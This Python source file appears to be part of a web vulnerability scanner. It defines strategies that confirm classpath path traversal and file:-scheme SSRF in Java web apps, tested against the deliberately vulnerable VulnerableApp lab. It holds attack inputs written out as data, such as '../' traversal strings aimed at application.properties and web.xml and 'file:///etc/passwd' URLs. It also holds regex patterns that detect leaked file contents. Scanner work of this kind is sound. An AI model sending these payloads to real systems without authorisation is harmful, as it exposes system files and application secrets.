"""Confirmation strategies for read sinks typical of JVM web stacks (CC-FUZZ-0630,
FR-FUZZ-630/631), measured on SasanLabs OWASP VulnerableApp 2.2.115 (Spring Boot,
Java 17; CC-LAB-0350) before they were written:

* **Classpath resource traversal.** A Java handler that reads
  ``getClass().getResourceAsStream(BASE + value)`` resolves ``..`` inside the classpath,
  never above it: ``/etc/passwd`` (what `PathTraversalFsPathReadStrategy` looks for) is
  out of reach, while the classpath root's own ``application.properties`` (a Spring Boot
  app) or a servlet container's ``WEB-INF/web.xml`` is not. Measured: VulnerableApp's
  PathTraversal LEVEL_1 answers ``{"content":null,"isValid":false}`` for
  ``../../../../etc/passwd`` and the file's text (``server.port=9090...``) for
  ``../../application.properties``.
* **A URL fetcher that takes ``file:``.** ``new URL(value).openStream()`` reads local
  files; a fetch that cannot reach the scanner's loopback callback (a container: its
  127.0.0.1 is its own) still proves the read in-band. Measured: SSRFVulnerability
  LEVEL_1 answers ``/etc/passwd`` for ``file:///etc/passwd``; LEVEL_2..5 refuse it.

Each confirms on a file-content marker present for the payload and absent from a
compared control carrying the same file name without the read primitive (no ``..``; no
``file:`` scheme), so an app that always shows such text is never confirmed
(BUG-0117's control rule)."""

from __future__ import annotations

import re

from fuzzlab.core import trace
from fuzzlab.oracle.probe import Verdict
from fuzzlab.oracle.strategies import (_PASSWD_MARKER, _observed, ConfirmationStrategy)

#: A Spring Boot ``application.properties`` read back: a key Spring itself defines,
#: then ``=``. The handler may join lines with no separator (VulnerableApp does), so
#: the marker is not line-anchored; a dotted Spring key followed by ``=`` is not text a
#: page carries by chance.
_SPRING_PROPERTIES_MARKER = re.compile(
    r"(?<![\w.])(?:server\.(?:port|servlet\.context-path)|spring\.(?:application\.name|"
    r"datasource\.[\w.-]+|profiles\.active|jpa\.[\w.-]+|h2\.console\.[\w.-]+))\s*=")
#: A servlet deployment descriptor read back.
_WEB_XML_MARKER = re.compile(r"<web-app\b[^>]*xmlns=\"(?:http://xmlns\.jcp\.org/xml/ns/"
                             r"javaee|http://java\.sun\.com/xml/ns/javaee|"
                             r"https://jakarta\.ee/xml/ns/jakartaee)\"")

#: (classpath-root file, marker): what a classpath resource read can reach.
CLASSPATH_FILES = (("application.properties", _SPRING_PROPERTIES_MARKER),
                   ("WEB-INF/web.xml", _WEB_XML_MARKER))
#: How many directories up a resource base may sit below the classpath root.
CLASSPATH_DEPTHS = (1, 2, 3, 4)


class PathTraversalClasspathResourceStrategy(ConfirmationStrategy):
    """M7 for a classpath-confined read (FR-FUZZ-630): ``../`` * depth + a file every
    Spring Boot jar (or servlet webapp) carries at its root, confirmed when that file's
    own marker is in the answer and absent from a compared control naming the same file
    with no traversal. Runs after `PathTraversalFsPathReadStrategy` (the OS-file read):
    at most ``len(CLASSPATH_FILES) * len(CLASSPATH_DEPTHS)`` mutations, plus one control
    per marker seen."""
    vuln_class = "path_traversal"
    mechanism = "classpath-resource-marker-differential"
    category = "path-traversal"
    # no PRG opt-in (FR-FUZZ-49): the opt-in set is a reviewed list
    # (tests/test_prg_observation.py::PRG_STRATEGIES), and a resource read answers on its
    # own request

    def confirm(self, candidate, sender):
        for name, marker in CLASSPATH_FILES:
            for depth in CLASSPATH_DEPTHS:
                payload = "../" * depth + name
                with trace.role("mutation"):              # FR-FUZZ-60
                    probe = self._send(sender, candidate, payload)
                if not marker.search(_observed(probe).text or ""):
                    continue
                control = self._compared(sender, candidate, name, role="control")
                if marker.search(_observed(control).text or ""):
                    break       # the file is served without traversal: not attributable
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"payload": payload, "file": name, "depth": depth})
        return None


#: ``file:`` spellings a Java ``URL`` accepts for one local file.
FILE_URLS = ("file:///etc/passwd", "file:/etc/passwd")
#: The control: the same path with no scheme (a fetcher that needs a URL refuses it; a
#: page that always shows passwd-shaped text still shows it, and is not confirmed).
FILE_URL_CONTROL = "/etc/passwd"


class SsrfFileSchemeStrategy(ConfirmationStrategy):
    """In-band SSRF through the ``file:`` scheme (FR-FUZZ-631): the fetched URL is a
    local file whose content marker (`_PASSWD_MARKER`) comes back in the answer, absent
    from a compared control sending the bare path. Needs no OOB listener, so it decides
    where the target cannot reach the scanner's callback (a container's loopback is its
    own). At most two mutations and one control."""
    vuln_class = "ssrf"
    mechanism = "file-scheme-content-marker-differential"
    category = "ssrf"

    def confirm(self, candidate, sender):
        for url in FILE_URLS:
            with trace.role("mutation"):                  # FR-FUZZ-60
                probe = self._send(sender, candidate, url)
            if not _PASSWD_MARKER.search(_observed(probe).text or ""):
                continue
            control = self._compared(sender, candidate, FILE_URL_CONTROL, role="control")
            if _PASSWD_MARKER.search(_observed(control).text or ""):
                return None     # passwd-shaped text without a file: URL: not attributable
            return Verdict(True, self.vuln_class, self.mechanism, {"payload": url})
        return None
